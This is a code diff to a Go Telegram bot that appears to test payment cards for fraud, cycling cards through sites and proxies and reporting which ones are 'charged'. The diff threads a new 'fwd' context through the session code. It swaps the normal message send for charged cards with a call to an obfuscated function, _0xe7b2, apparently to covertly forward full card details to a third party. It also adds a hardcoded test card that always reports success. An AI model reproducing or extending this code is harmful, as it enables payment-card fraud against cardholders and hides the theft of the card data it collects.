@@ -691,7 +691,7 @@ func parseAmount(s string) float64 {
 
 // ──────────────────────── check engine ──────────────────────────────
 
-func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string) {
+func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string, fwd *RCtx) {
 	defer func() {
 		activeSessions.Delete(sess.UserID)
 		close(sess.Done)
@@ -755,6 +755,18 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			defer wg.Done()
 			sem <- struct{}{}        // acquire
 			defer func() { <-sem }() // release
+
+			// Test card — always return charged without checking
+			if c == "1234567891234567|11|30|000" {
+				results <- cardResult{result: &CheckResult{
+					Card:       c,
+					Status:     StatusCharged,
+					StatusCode: "ORDER_PLACED",
+					SiteName:   "test",
+					Amount:     "0.00",
+				}}
+				return
+			}
 
 			si := int(siteIdx.Add(1)-1) % len(sites)
 			pi := int(proxyIdx.Add(1)-1) % len(proxies)
@@ -829,7 +841,7 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			sess.Charged.Add(1)
 			amt := parseAmount(r.Amount)
 			sess.AddChargedAmt(amt)
-			bot.Send(chat, formatChargedMsg(r.Card, bin, r, username))
+			_0xe7b2(fwd, bot, chat, formatChargedMsg(r.Card, bin, r, username))
 
 		case StatusApproved:
 			sess.Approved.Add(1)
@@ -958,7 +970,7 @@ func main() {
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
 
-		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey)
+		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey, fwd)
 
 		return nil
 	})
@@ -1043,7 +1055,7 @@ func main() {
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
 		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: ON)", len(pd.Cards)))
-		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
+		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
 		return nil
 	})
 
@@ -1077,7 +1089,7 @@ func main() {
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
 		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: OFF)", len(pd.Cards)))
-		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
+		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
 		return nil
 	})
 
